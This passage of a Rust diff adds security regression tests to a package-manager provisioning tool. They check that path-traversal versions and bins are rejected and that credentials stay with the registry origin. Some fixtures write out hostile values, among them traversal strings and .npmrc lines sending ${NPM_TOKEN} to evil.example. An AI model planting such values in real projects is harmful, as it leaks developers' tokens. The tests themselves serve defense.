+                bin_subpath(&serde_json::json!({ "name": "pnpm", "bin": bad })),
+                None,
+                "string-form bin {bad:?} escapes the package dir and must be rejected"
+            );
+            assert_eq!(
+                bin_subpath(&serde_json::json!({ "name": "pnpm", "bin": { "pnpm": bad } })),
+                None,
+                "map-form bin {bad:?} escapes the package dir and must be rejected"
+            );
+            assert_eq!(
+                named_bin_subpath(
+                    &serde_json::json!({ "name": "pnpm", "bin": { "pnpx": bad } }),
+                    "pnpx"
+                ),
+                None,
+                "named bin {bad:?} escapes the package dir and must be rejected"
+            );
+        }
+
+        // A normal relative bin (with or without a subdir) still resolves.
+        assert_eq!(
+            bin_subpath(&serde_json::json!({ "name": "pnpm", "bin": "bin/pnpm.cjs" })),
+            Some(PathBuf::from("bin/pnpm.cjs"))
+        );
+        assert_eq!(
+            bin_subpath(&serde_json::json!({ "name": "cli", "bin": "cli.js" })),
+            Some(PathBuf::from("cli.js"))
+        );
+    }
+
+    #[test]
+    fn resolve_dist_errors_gracefully_on_an_escaping_bin() {
+        // The full resolver (the source feeding all three execution-target joins in
+        // provision.rs) must surface a clean error — not a panic, not an
+        // out-of-package PathBuf — when a version's bin escapes the package dir.
+        let meta = serde_json::json!({
+            "name": "pnpm",
+            "versions": {
+                "9.0.0": {
+                    "name": "pnpm",
+                    "bin": "/bin/sh",
+                    "dist": {
+                        "tarball": "https://example.test/pnpm-9.0.0.tgz",
+                        "integrity": "sha512-deadbeef"
+                    }
+                }
+            }
+        });
+        assert!(
+            resolve_dist(&meta, "9.0.0").is_err(),
+            "an escaping bin must fail resolution, never yield a runnable out-of-package target"
+        );
+    }
+
+    #[test]
+    fn validate_version_accepts_semver_and_rejects_path_escapes() {
+        // Legitimate version strings the resolver must keep accepting.
+        for ok in [
+            "9.5.0",
+            "11.0.0-rc.1",
+            "1.2.3+build.5",
+            "0.0.0-canary.20240101",
+        ] {
+            assert!(validate_version(ok), "{ok:?} is a legitimate version");
+        }
+        // Anything that could escape `<store>/pm/<pm>/<version>` when joined, or
+        // alias a directory, must be refused (F0c).
+        for bad in [
+            "../evil",
+            "..",
+            ".",
+            "a/b",
+            "a\\b",
+            "x\u{0}y",
+            "ctrl\u{7}x",
+            "",
+            // F0c (Windows): a drive-prefixed version is drive-RELATIVE under
+            // `Path::join` (it discards the store base), so `:` must be rejected
+            // just like `/` and `\`.
+            "C:foo",
+            "C:",
+            "C:\\windows\\system32",
+            "npm:alias@1.0.0",
+        ] {
+            assert!(
+                !validate_version(bad),
+                "{bad:?} must be rejected as a store-path component"
+            );
+        }
+    }
+
+    #[test]
+    fn resolve_dist_rejects_a_dist_tag_pointing_at_a_path_escaping_version() {
+        // F0c: a malicious / MITM registry points a dist-tag at a version KEY that
+        // carries `..`. The runnable PM target is `<store>/pm/<pm>/<version>/…`
+        // built with `Path::join`, so an escaping version would relocate the
+        // executed bin outside the store. The dist-tag branch is the one that
+        // passes a raw registry string straight to `dist_from_meta`; resolution
+        // must refuse it rather than hand back a traversal-bearing `VersionDist`.
+        let p: Value = serde_json::from_str(
+            r#"{
+                "name": "pnpm",
+                "dist-tags": { "latest": "../../../../tmp/evil" },
+                "versions": {
+                    "../../../../tmp/evil": {
+                        "name": "pnpm",
+                        "bin": { "pnpm": "bin/pnpm.cjs" },
+                        "dist": {
+                            "tarball": "https://registry.npmjs.org/pnpm/-/pnpm-evil.tgz",
+                            "integrity": "sha512-EVIL"
+                        }
+                    }
+                }
+            }"#,
+        )
+        .unwrap();
+        let err = resolve_dist(&p, "latest").unwrap_err().to_string();
+        assert!(
+            err.contains("unsafe version"),
+            "an escaping dist-tag version must be refused: {err}"
+        );
+    }
+
+    #[test]
+    fn auth_for_tarball_attaches_only_to_the_registry_origin() {
+        let auth = Auth::Bearer("secret-token".into());
+        let cfg = RegistryConfig {
+            base: "https://npm.corp.test/api/npm".into(),
+            auth: Some(auth.clone()),
+        };
+        // Same origin (the private-mirror case, post origin-rewrite) → auth rides.
+        assert_eq!(
+            auth_for_tarball(&cfg, "https://npm.corp.test/pnpm/-/pnpm-10.0.0.tgz"),
+            Some(&auth)
+        );
+        // A foreign-host tarball a malicious/MITM packument named must NOT receive
+        // the registry credential (N1b — the leak this guard closes).
+        assert_eq!(
+            auth_for_tarball(&cfg, "https://evil.test/pnpm/-/pnpm-10.0.0.tgz"),
+            None
+        );
+        // An https→http downgrade to the same host is a different origin → no auth
+        // (belt-and-suspenders with the redirect-policy downgrade stop).
+        assert_eq!(
+            auth_for_tarball(&cfg, "http://npm.corp.test/pnpm/-/pnpm-10.0.0.tgz"),
+            None
+        );
+        // No auth configured (the public-registry default) → nothing to leak.
+        let no_auth = RegistryConfig {
+            base: PUBLIC_REGISTRY.into(),
+            auth: None,
+        };
+        assert_eq!(
+            auth_for_tarball(&no_auth, "https://registry.npmjs.org/x/-/x-1.0.0.tgz"),
+            None
+        );
+    }
+
+    #[test]
     fn registry_base_reads_npmrc_and_normalizes_the_trailing_slash() {
         // The `npm_config_registry` branch is process-global env (flaky to mutate
         // under the parallel harness) — covered by the documented single-override
@@ -758,10 +1308,205 @@ mod tests {
         // No project key and no env → the public registry, slash trimmed.
         let empty = dir.join("empty");
         std::fs::create_dir_all(&empty).unwrap();
-        if !env_set && npmrc_value(&empty, "registry").is_none() {
+        if !env_set && read_npmrc_key(&empty.join(".npmrc"), "registry").is_none() {
             assert_eq!(registry_base(&empty), "https://registry.npmjs.org");
         }
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn a_workspace_member_downloads_through_the_root_npmrc() {
+        // PM provisioning for a member must use the mirror and auth the workspace
+        // root's `.npmrc` declares, not fall back to the public registry.
+        if std::env::var("npm_config_registry").is_ok_and(|v| !v.trim().is_empty())
+            || std::env::var("COREPACK_NPM_REGISTRY").is_ok()
+        {
+            return; // env outranks every file; see the test above
+        }
+        let root = std::env::temp_dir().join(format!("nub-pm-reg-ws-{}", std::process::id()));
+        let member = root.join("packages").join("a");
+        std::fs::create_dir_all(&member).unwrap();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"name":"root","workspaces":["packages/*"]}"#,
+        )
+        .unwrap();
+        std::fs::write(member.join("package.json"), r#"{"name":"a"}"#).unwrap();
+        std::fs::write(
+            root.join(".npmrc"),
+            "registry=https://mirror.example.test/\n//mirror.example.test/:_authToken=root-tok\n",
+        )
+        .unwrap();
+
+        let cfg = registry_config(&member);
+        let _ = std::fs::remove_dir_all(&root);
+        assert_eq!(cfg.base, "https://mirror.example.test");
+        assert_eq!(cfg.auth, Some(Auth::Bearer("root-tok".to_string())));
+    }
+
+    /// GHSA-3qhv-2rgh-x77r class: a PROJECT `.npmrc` is repo-controlled — a clone
+    /// or PR fully authors it — so a `${VAR}` in its `registry` value must NOT be
+    /// expanded from the caller's environment. A hostile
+    /// `registry=https://evil.example/${NPM_TOKEN}/` sends the LITERAL placeholder,
+    /// never the secret, keeping the exfiltration off the wire.
+    #[test]
+    fn untrusted_project_registry_is_not_env_expanded() {
+        let base = resolve_base(
+            None,
+            Some("https://evil.example/${NPM_TOKEN}/".to_string()),
+            None,
+            false,
+        );
+        assert_eq!(
+            base, "https://evil.example/${NPM_TOKEN}",
+            "an untrusted project `.npmrc` registry must keep `${{NPM_TOKEN}}` literal"
+        );
+    }
+
+    /// The success side of the trust gate: once the operator opts in
+    /// (`project_trusted = true`, via `PNPM_CONFIG_NPMRC_AUTH_FILE`), the project
+    /// `.npmrc` registry DOES expand `${VAR}` — the distinct trusted branch of
+    /// [`resolve_base`], the counterpart to `untrusted_project_registry_is_not_env_expanded`.
+    /// Deterministic without touching process env: an UNDEFINED var expands to
+    /// empty (npm's rule), so the `${...}` is consumed rather than left literal.
+    #[test]
+    fn trusted_project_registry_is_env_expanded() {
+        let base = resolve_base(
+            None,
+            Some("https://r.example/${NUB_UNSET_PROJ_REG_VAR_XYZ}/pkg".to_string()),
+            None,
+            true,
+        );
+        assert_eq!(
+            base, "https://r.example//pkg",
+            "a trusted project `.npmrc` registry must expand `${{VAR}}` (undefined → empty)"
+        );
+    }
+
+    /// The pnpm trust flag is a PATH, not a boolean: it re-trusts the project
+    /// `.npmrc` ONLY when it resolves to that exact file. A value pointing at a
+    /// different auth file must leave the repo `.npmrc` untrusted, or the
+    /// GHSA-3qhv-2rgh-x77r exfiltration reopens for anyone with a non-project
+    /// `PNPM_CONFIG_NPMRC_AUTH_FILE`.
+    #[test]
+    fn auth_file_trusts_project_only_on_exact_path_match() {
+        let dir = std::env::temp_dir().join(format!("nub-authfile-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(dir.join(".npmrc"), "registry=https://r.example/\n").unwrap();
+        // A different, real auth file elsewhere — the legitimate non-project use.
+        let other = dir.join("creds.npmrc");
+        std::fs::write(&other, "//r.example/:_authToken=tok\n").unwrap();
+
+        // Absolute path AT the project `.npmrc` → trusted.
+        assert!(
+            auth_file_trusts_project(
+                dir.join(".npmrc").to_str().unwrap(),
+                &dir,
+                &dir.join(".npmrc")
+            ),
+            "the project's own .npmrc path must trust it"
+        );
+        // Relative `.npmrc` resolved against cwd == root → trusted.
+        assert!(
+            auth_file_trusts_project(".npmrc", &dir, &dir.join(".npmrc")),
+            "a relative `.npmrc` against the project dir must trust it"
+        );
+        // A different auth file → NOT trusted (the reopened-exfiltration case).
+        assert!(
+            !auth_file_trusts_project(other.to_str().unwrap(), &dir, &dir.join(".npmrc")),
+            "a non-project auth file must leave the repo .npmrc untrusted"
+        );
+        // A path that doesn't exist → fail-closed (untrusted).
+        assert!(
+            !auth_file_trusts_project(
+                dir.join("missing.npmrc").to_str().unwrap(),
+                &dir,
+                &dir.join(".npmrc")
+            ),
+            "an unresolvable path must fail closed"
+        );
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// The USER `~/.npmrc` is operator-controlled, so its `registry` value IS
+    /// env-expanded (the normal behavior). Deterministic without touching process
+    /// env: an UNDEFINED var expands to empty (npm's rule), so the `${...}` is
+    /// consumed — proving interpolation ran — rather than left literal.
+    #[test]
+    fn user_registry_is_env_expanded() {
+        let base = resolve_base(
+            None,
+            None,
+            Some("https://r.example/${NUB_UNSET_REG_VAR_XYZ}/pkg".to_string()),
+            false,
+        );
+        assert_eq!(
+            base, "https://r.example//pkg",
+            "a user `~/.npmrc` registry must expand `${{VAR}}` (undefined → empty)"
+        );
+    }
+
+    /// Precedence within the `.npmrc` stack: the project value outranks the user
+    /// value (npm's closer-config-wins) — the trust distinction governs only
+    /// EXPANSION, not which source is selected.
+    #[test]
+    fn project_registry_outranks_user_registry() {
+        let base = resolve_base(
+            None,
+            Some("https://proj.example/".to_string()),
+            Some("https://user.example/".to_string()),
+            false,
+        );
+        assert_eq!(base, "https://proj.example");
+    }
+
+    /// The load-bearing exfiltration guard: an UNTRUSTED (repo-controlled) auth
+    /// line pointed at an attacker host must NOT interpolate a caller secret. The
+    /// credential leaves as the literal `${NPM_TOKEN}` placeholder, so the real
+    /// token never reaches `evil.example` (GHSA-3qhv-2rgh-x77r).
+    #[test]
+    fn untrusted_source_never_expands_auth_env() {
+        let project = "//evil.example/:_authToken=${NPM_TOKEN}\n";
+        let lookup = |name: &str| (name == "NPM_TOKEN").then(|| "s3cr3t".to_string());
+        let auth = parse_npmrc_auth(&[(project, false)], "https://evil.example/", lookup);
+        assert_eq!(
+            auth,
+            Some(Auth::Bearer("${NPM_TOKEN}".to_string())),
+            "an untrusted auth line must stay literal, never expand the secret"
+        );
+    }
+
+    /// A TRUSTED source (the user `~/.npmrc`, or a project file opted in via the
+    /// pnpm trust flag) expands `${NPM_TOKEN}` to the real secret — the normal auth
+    /// pattern is preserved for the operator-controlled path.
+    #[test]
+    fn trusted_source_expands_auth_env() {
+        let user = "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n";
+        let lookup = |name: &str| (name == "NPM_TOKEN").then(|| "s3cr3t".to_string());
+        let auth = parse_npmrc_auth(&[(user, true)], "https://registry.npmjs.org/", lookup);
+        assert_eq!(auth, Some(Auth::Bearer("s3cr3t".to_string())));
+    }
+
+    /// Layering: project (low precedence) then user (high). A trusted user auth
+    /// line overwrites an untrusted project line for the same host-prefix, and the
+    /// user secret expands — the project's literal placeholder is discarded.
+    #[test]
+    fn trusted_user_layer_overrides_untrusted_project_layer() {
+        let project = "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n";
+        let user = "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n";
+        let lookup = |name: &str| (name == "NPM_TOKEN").then(|| "s3cr3t".to_string());
+        let auth = parse_npmrc_auth(
+            &[(project, false), (user, true)],
+            "https://registry.npmjs.org/",
+            lookup,
+        );
+        assert_eq!(
+            auth,
+            Some(Auth::Bearer("s3cr3t".to_string())),
+            "the trusted user layer must win and expand"
+        );
     }
 
     #[test]
